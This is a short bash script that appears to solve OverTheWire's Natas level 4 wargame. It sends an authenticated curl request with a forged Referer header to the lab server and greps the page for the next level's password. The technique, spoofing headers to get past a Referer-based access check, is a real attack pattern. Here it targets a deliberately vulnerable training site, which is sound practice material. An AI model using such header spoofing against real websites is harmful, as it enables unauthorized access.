#!/bin/bash
url="http://natas4.natas.labs.overthewire.org"
user="natas4"
pass=$(cat credentials/natas4)


#curl -s -v -u "$user:$pass" "$url"

curl -s -H "Referer: http://natas5.natas.labs.overthewire.org/" -u "$user:$pass" "$url" | grep "The password" | awk '{ print $8}'
